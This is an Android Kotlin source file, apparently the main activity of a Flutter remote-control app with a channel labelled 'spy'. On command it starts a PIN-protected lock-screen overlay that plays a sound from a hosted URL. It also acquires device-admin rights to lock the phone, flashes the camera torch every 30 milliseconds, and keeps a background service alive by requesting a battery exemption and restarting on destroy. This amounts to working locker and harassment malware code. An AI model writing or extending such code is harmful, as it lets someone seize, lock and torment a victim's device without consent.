package com.nex.panel

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {

    companion object {
        private const val SPY_CHANNEL         = "com.nex.panel/spy"
        private const val STROBE_CHANNEL      = "com.nex.panel/strobe"
        private const val DEVICE_INFO_CHANNEL = "flutter/device_info"
    }

    private val uiHandler        = Handler(Looper.getMainLooper())
    private var isStrobeRunning  = false
    private var strobeRunnable: Runnable? = null

    override fun onCreate(savedInstanceState: android.os.Bundle?) {
        super.onCreate(savedInstanceState)
        // Minta battery optimization exemption agar service tidak di-kill Android
        requestBatteryOptimizationExemption()
        // Start BackgroundService setelah sedikit delay agar Flutter engine siap
        uiHandler.postDelayed({ startBackgroundService() }, 1000)
    }

    // ── Minta izin agar tidak masuk battery optimization (doze mode) ─────
    // Tanpa ini, Android akan kill service setelah beberapa menit layar mati
    private fun requestBatteryOptimizationExemption() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                val pkg = packageName
                if (!pm.isIgnoringBatteryOptimizations(pkg)) {
                    // Langsung request tanpa dialog — langsung ke halaman setting
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$pkg")
                    }
                    try {
                        startActivity(intent)
                    } catch (e: Exception) {
                        // Fallback: buka halaman battery setting umum
                        try {
                            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                        } catch (ignored: Exception) {}
                    }
                }
            }
        } catch (e: Exception) { /* silent */ }
    }

    // ── Start BackgroundService ──────────────────────────────────────
    private fun startBackgroundService() {
        try {
            val intent = Intent(this, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) { /* silent */ }
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // ── 1. DEVICE INFO CHANNEL ───────────────────────────────────
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, DEVICE_INFO_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "getDeviceInfo" -> result.success(
                        mapOf(
                            "brand"   to android.os.Build.BRAND,
                            "model"   to android.os.Build.MODEL,
                            "device"  to android.os.Build.DEVICE,
                            "product" to android.os.Build.PRODUCT,
                            "sdk"     to android.os.Build.VERSION.SDK_INT.toString()
                        )
                    )
                    else -> result.notImplemented()
                }
            }

        // ── 2. STROBE / FLASH CHANNEL ────────────────────────────────
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, STROBE_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "startStrobe" -> { startStrobeEffect(); result.success(null) }
                    "stopStrobe"  -> { stopStrobeEffect();  result.success(null) }
                    "torchOn"     -> { startStrobeEffect(); result.success(null) } // alias
                    "torchOff"    -> { stopStrobeEffect();  result.success(null) } // alias
                    else          -> result.notImplemented()
                }
            }

        // ── 3. SPY / LOCK CHANNEL ────────────────────────────────────
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SPY_CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {

                    "startLockOverlay" -> {
                        try {
                            val msg      = call.argument<String>("message")  ?: "DEVICE IS LOCKED"
                            val pin      = call.argument<String>("pin")      ?: "1234"
                            val soundUrl = call.argument<String>("soundUrl")
                                ?: "https://files.catbox.moe/mu2985.mp3"
                            val intent = Intent(this, LockOverlayService::class.java).apply {
                                action = LockOverlayService.ACTION_LOCK
                                putExtra(LockOverlayService.EXTRA_MESSAGE,   msg)
                                putExtra(LockOverlayService.EXTRA_PIN,       pin)
                                putExtra(LockOverlayService.EXTRA_SOUND_URL, soundUrl)
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                startForegroundService(intent)
                            } else {
                                startService(intent)
                            }
                            result.success(true)
                        } catch (e: Exception) {
                            result.error("LOCK_OVERLAY_ERR", e.message, null)
                        }
                    }

                    "stopLockOverlay" -> {
                        try {
                            val intent = Intent(this, LockOverlayService::class.java).apply {
                                action = LockOverlayService.ACTION_UNLOCK
                            }
                            startService(intent)
                            result.success(true)
                        } catch (e: Exception) {
                            result.success(false)
                        }
                    }

                    "lockDeviceNow" -> {
                        try {
                            val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                            val admin = ComponentName(applicationContext, DeviceAdminHelper::class.java)
                            if (dpm.isAdminActive(admin)) {
                                dpm.lockNow()
                                result.success(true)
                            } else {
                                val adminIntent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                        "Diperlukan untuk fitur Lock Device.")
                                }
                                startActivity(adminIntent)
                                result.success(false)
                            }
                        } catch (e: Exception) {
                            result.error("LOCK_ERR", e.message, null)
                        }
                    }

                    else -> result.notImplemented()
                }
            }
    }

    // ── Strobe effect (kedap-kedip 30ms) ────────────────────────────
    private fun startStrobeEffect() {
        if (isStrobeRunning) return
        isStrobeRunning = true
        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        var on = false
        strobeRunnable = object : Runnable {
            override fun run() {
                try {
                    val id = cm.cameraIdList[0]
                    on = !on
                    cm.setTorchMode(id, on)
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30)
                } catch (e: Exception) {
                    isStrobeRunning = false
                }
            }
        }
        uiHandler.post(strobeRunnable!!)
    }

    private fun stopStrobeEffect() {
        isStrobeRunning = false
        strobeRunnable?.let { uiHandler.removeCallbacks(it) }
        try {
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            cm.setTorchMode(cm.cameraIdList[0], false)
        } catch (e: Exception) { /* ignore */ }
    }

    override fun onDestroy() {
        stopStrobeEffect()
        // Restart BackgroundService kalau activity di-destroy
        startBackgroundService()
        super.onDestroy()
    }
}
